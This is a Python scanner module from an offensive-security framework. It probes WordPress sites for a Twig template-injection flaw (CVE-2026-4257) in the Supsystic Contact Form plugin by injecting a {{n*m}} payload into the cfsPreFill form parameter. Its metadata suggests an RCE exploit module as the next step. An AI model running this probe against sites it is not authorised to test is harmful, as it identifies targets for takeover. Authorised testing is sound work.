#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Contact Form by Supsystic <= 1.7.36 Twig SSTI (CVE-2026-4257)."""

import random
import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "contact-form-by-supsystic"
_VULN_HIGH = (1, 7, 36)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "Supsystic Contact Form CVE-2026-4257 detect",
        "description": "Detects cfsPreFill Twig SSTI via {{n*m}} reflected in form field.",
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-4257",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-4257"],
        "modules": ["exploits/multi/http/supsystic_cve_2026_4257_ssti_rce"],
        "tags": ["web", "scanner", "wordpress", "ssti", "twig", "cve-2026-4257"],
        "agent": {
            "approval_required": True,
            "chain": {
                "suggested_followups": ["exploits/multi/http/supsystic_cve_2026_4257_ssti_rce"],
            },
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def _page_paths(self) -> list:
        home = self.http_request(method="GET", path=self._join("/"), allow_redirects=True)
        paths = []
        if home:
            paths.extend(re.findall(r'href="(?:https?://[^/"]+)?(/\?page_id=\d+)"', home.text or ""))
        for d in ("/?page_id=2", "/?page_id=3", "/?page_id=4", "/?page_id=5", "/?page_id=6"):
            if d not in paths:
                paths.append(d)
        return paths

    def run(self):
        base = self.wp_normalize_base_path(self.base_path or "/")
        version = self.wp_plugin_version(_PLUGIN, base) or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        n1, n2 = random.randint(40000, 44800), random.randint(40000, 44800)
        expected = str(n1 * n2)
        payload = f"{{{{{n1}*{n2}}}}}"
        for page in self._page_paths():
            sep = "&" if "?" in page else "?"
            path = f"{page}{sep}cfsPreFill=1&first_name={payload}"
            resp = self.http_request(method="GET", path=self._join(path), allow_redirects=True)
            body = resp.text or "" if resp else ""
            if (
                resp
                and int(resp.status_code or 0) == 200
                and "contact-form-by-supsystic" in body
                and f'value="{expected}"' in body
            ):
                self.set_info(
                    severity="critical",
                    reason="Supsystic cfsPreFill Twig SSTI confirmed",
                    path=page,
                    cve="CVE-2026-4257",
                )
                return True
        return False
